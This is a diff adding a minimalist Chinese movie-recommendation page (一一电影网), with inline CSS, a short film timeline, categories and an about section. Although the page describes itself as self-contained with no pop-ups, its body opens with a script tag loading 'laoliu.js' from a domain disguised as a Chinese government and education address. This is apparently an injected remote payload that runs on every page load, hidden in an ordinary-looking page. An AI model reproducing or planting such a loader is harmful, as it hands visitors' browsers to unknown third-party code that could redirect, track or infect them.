@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>一一电影网 - 一部一部，慢慢看</title>
+<meta name="description" content="一一电影网，极简留白风影视单页：不刷量、不弹窗、不催你。一部一部挑，慢慢看。官网 https://yiyidianyingwang-h5.github.io">
+<meta name="keywords" content="一一电影网, 极简电影, 慢看电影, 免费电影, 在线观看">
+<meta name="author" content="一一电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#0a0e1a">
+<style>
+:root{
+  --bg:#ffffff;
+  --ink:#0a0e1a;
+  --ink-soft:#4a5268;
+  --ink-light:#8a92a6;
+  --line:#e2e5ed;
+  --line-soft:#f0f2f7;
+  --accent:#1a2b5c;
+  --accent-soft:#e8ecf6;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:60px}
+body{
+  background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif;
+  line-height:1.82;font-weight:300;letter-spacing:.02em;
+}
+a{color:var(--accent);text-decoration:none}
+
+/* 顶栏：极简一条线 */
+.top{
+  position:sticky;top:0;z-index:50;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:16px 24px;border-bottom:1px solid var(--line);
+  background:rgba(255,255,255,.95);backdrop-filter:blur(8px);
+}
+.logo{font-size:22px;font-weight:200;letter-spacing:6px}
+.logo b{font-weight:700;color:var(--accent)}
+.nav{display:flex;gap:24px;font-size:13px;color:var(--ink-light)}
+.nav a{color:var(--ink-light)}
+.nav a:hover{color:var(--accent)}
+
+/* Hero：一个大"1" */
+.hero{
+  text-align:center;padding:80px 20px 60px;
+  border-bottom:1px solid var(--line);
+}
+.hero .big-one{
+  font-size:140px;font-weight:100;line-height:1;color:var(--accent);
+  letter-spacing:-8px;display:inline-block;
+}
+.hero h1{font-size:22px;font-weight:300;margin:20px 0 10px;color:var(--ink)}
+.hero h1 b{font-weight:600}
+.hero p{color:var(--ink-light);max-width:420px;margin:0 auto 20px;font-size:14px}
+.hero .url{
+  display:inline-block;font-family:Consolas,monospace;font-size:12px;
+  border:1px solid var(--line);color:var(--ink-soft);
+  padding:8px 16px;border-radius:2px;
+}
+
+/* 主区 */
+.main{
+  max-width:680px;margin:0 auto;padding:40px 20px 60px;
+}
+
+/* 垂直时间线 */
+.timeline{position:relative;padding-left:32px}
+.timeline::before{
+  content:'';position:absolute;left:8px;top:0;bottom:0;width:1px;background:var(--line);
+}
+.entry{
+  position:relative;padding-bottom:36px;
+}
+.entry::before{
+  content:counter(entry-num,decimal-leading-zero);
+  counter-increment:entry-num;
+  position:absolute;left:-32px;top:2px;width:16px;height:16px;
+  background:var(--bg);border:1px solid var(--accent);border-radius:50%;
+  font-size:9px;display:grid;place-items:center;color:var(--accent);font-weight:600;
+}
+.entry h3{font-size:16px;font-weight:500;margin-bottom:4px}
+.entry .meta{font-size:12px;color:var(--ink-light);margin-bottom:6px}
+.entry p{font-size:14px;color:var(--ink-soft)}
+.entry .go{
+  display:inline-block;margin-top:6px;font-size:12px;color:var(--accent);
+  border-bottom:1px solid transparent;padding-bottom:1px;
+}
+.entry .go:hover{border-bottom-color:var(--accent)}
+.timeline{counter-reset:entry-num}
+
+/* 分隔 */
+.section-divider{
+  text-align:center;padding:30px 0 10px;
+  font-size:12px;color:var(--ink-light);letter-spacing:4px;
+}
+.section-divider::before{content:'— 0 1 —'}
+
+/* 分类：纯文字列表 */
+.cat-list{
+  list-style:none;padding:0;
+}
+.cat-list li{
+  border-bottom:1px solid var(--line-soft);padding:14px 0;
+  display:flex;align-items:center;gap:16px;
+}
+.cat-list li:last-child{border-bottom:none}
+.cat-list .num{
+  font-size:13px;color:var(--ink-light);font-variant-numeric:tabular-nums;min-width:24px;
+}
+.cat-list b{font-size:15px;font-weight:500;flex:1}
+.cat-list span{font-size:12px;color:var(--ink-light)}
+
+/* 关于 */
+.about{
+  padding-top:30px;border-top:1px solid var(--line);
+}
+.about h2{font-size:18px;font-weight:400;margin-bottom:14px}
+.about p{font-size:14px;color:var(--ink-soft);margin-bottom:10px}
+.about code{
+  background:var(--accent-soft);color:var(--accent);
+  padding:2px 6px;border-radius:3px;font-family:Consolas,monospace;font-size:13px;
+}
+
+/* 页脚 */
+.foot{
+  text-align:center;padding:30px 20px;border-top:1px solid var(--line);
+  color:var(--ink-light);font-size:12px;
+}
+
+@media(max-width:600px){
+  .hero .big-one{font-size:90px}
+  .hero h1{font-size:18px}
+  .top{padding:12px 16px}
+  .nav{gap:14px}
+  .main{padding:30px 16px 40px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶栏 -->
+<header class="top">
+  <div class="logo">一<b>一</b></div>
+  <nav class="nav">
+    <a href="#home">首页</a>
+    <a href="#list">片单</a>
+    <a href="#cats">分类</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="big-one">1</div>
+  <h1>一一电影网 · <b>一部一部，慢慢看</b></h1>
+  <p>不刷量、不弹窗、不催你。每天只推几部值得看完的片子，像写信一样认真。</p>
+  <div class="url">https://yiyidianyingwang-h5.github.io</div>
+</section>
+
+<!-- 主区 -->
+<main class="main">
+
+  <!-- 片单时间线 -->
+  <section id="list">
+    <div class="section-divider"></div>
+    <div style="height:20px"></div>
+    <div class="timeline">
+      <div class="entry">
+        <h3>一一（2000）</h3>
+        <div class="meta">剧情 / 杨德昌 / 173 min</div>
+        <p>每个人只能看到一半的世界。所以你需要别人，需要电影，需要一一看完。</p>
+        <a class="go" href="#">阅读更多 ›</a>
+      </div>
+      <div class="entry">
+        <h3>某处，某人（2021）</h3>
+        <div class="meta">爱情 / 法国 / 108 min</div>
+        <p>两个住在同一条街却从未相遇的人，隔着屏幕和窗户，过着平行的生活。</p>
+        <a class="go" href="#">阅读更多 ›</a>
+      </div>
+      <div class="entry">
+        <h3>驾驶我的车（2021）</h3>
+        <div class="meta">剧情 / 滨口龙介 / 179 min</div>
+        <p>沉默的车厢里，台词一句一句说出来，像手术刀一样剖开人心。</p>
+        <a class="go" href="#">阅读更多 ›</a>
+      </div>
+      <div class="entry">
+        <h3>花样年华（2000）</h3>
+        <div class="meta">爱情 / 王家卫 / 98 min</div>
+        <p>如果多一张船票，你会不会跟我走。如果多一部片子，你会不会停下来。</p>
+        <a class="go" href="#">阅读更多 ›</a>
+      </div>
+      <div class="entry">
+        <h3>罗马（2018）</h3>
+        <div class="meta">剧情 / 阿方索·卡隆 / 135 min</div>
+        <p>黑白画面里的日常，比任何特效都更接近生活的真相。</p>
+        <a class="go" href="#">阅读更多 ›</a>
+      </div>
+      <div class="entry">
+        <h3>坠落的审判（2023）</h3>
+        <div class="meta">悬疑 / 茹斯汀·特里耶 / 151 min</div>
+        <p>谁杀了丈夫？也许问题不是"谁"，而是"为什么我们总是需要一个答案"。</p>
+        <a class="go" href="#">阅读更多 ›</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 分类 -->
+  <section id="cats" style="padding-top:40px">
+    <div class="section-divider"></div>
+    <div style="height:20px"></div>
+    <ul class="cat-list">
+      <li><span class="num">01</span><b>剧情</b><span>安静的力量</span></li>
+      <li><span class="num">02</span><b>爱情</b><span>两个人的宇宙</span></li>
+      <li><span class="num">03</span><b>悬疑</b><span>答案在最后一帧</span></li>
+      <li><span class="num">04</span><b>文艺</b><span>慢下来看世界</span></li>
+      <li><span class="num">05</span><b>纪录片</b><span>真实比虚构更重</span></li>
+      <li><span class="num">06</span><b>动画</b><span>另一种真实</span></li>
+      <li><span class="num">07</span><b>经典老片</b><span>值得再看一遍</span></li>
+      <li><span class="num">08</span><b>短片</b><span>一杯茶的时间</span></li>
+    </ul>
+  </section>
+
+  <!-- 关于 -->
+  <section class="about" id="about">
+    <div class="section-divider"></div>
+    <div style="height:20px"></div>
+    <h2>关于一一电影网</h2>
+    <p><strong>一一电影网</strong> 是一个极简留白风的影视展示单页。不追求信息密度，不堆砌卡片，不闪烁动画。像读一本薄书，一页一页翻。</p>
+    <p>官网：<code>https://yiyidianyingwang-h5.github.io</code></p>
+    <p>本页内链全部用 <code>#</code> 占位，CSS/DIV 全写在 HTML 里，不依赖后端，不生成 robots.txt 与 sitemap.xml，适合 GitHub Pages 直接托管。</p>
+    <p>必应收录：标题含主词、描述简洁、语义标题层级清晰、移动端无横滑——够了。</p>
+  </section>
+
+</main>
+
+<footer class="foot">
+  © 2026 一一电影网 · yiyidianyingwang-h5.github.io · 一部一部，慢慢看
+</footer>
+
+</body>
+</html>
